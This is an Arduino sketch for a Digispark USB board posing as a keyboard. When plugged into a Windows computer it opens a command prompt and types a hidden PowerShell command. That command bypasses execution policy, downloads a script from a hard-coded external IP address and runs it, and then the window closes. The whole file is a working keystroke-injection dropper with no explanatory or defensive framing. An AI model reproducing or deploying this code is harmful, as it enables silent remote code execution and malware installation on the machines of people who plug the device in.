#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("powershell -WindowStyle Hidden -NoLogo -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString('http://185.214.134.8:8012/ass');"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
